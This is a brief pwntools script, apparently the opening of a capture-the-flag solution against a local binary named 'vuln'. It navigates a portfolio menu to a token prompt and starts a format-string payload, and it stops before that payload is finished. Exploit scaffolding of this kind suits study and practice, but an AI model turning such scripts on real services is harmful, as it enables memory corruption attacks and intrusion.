from pwn import *

context.binary = exe = ELF('./vuln')

io = process()
io.recvuntil(b'View my portfolio\n')
io.sendline(b'1')
io.recvuntil(b'token?\n')
payload = fmtstr_payload()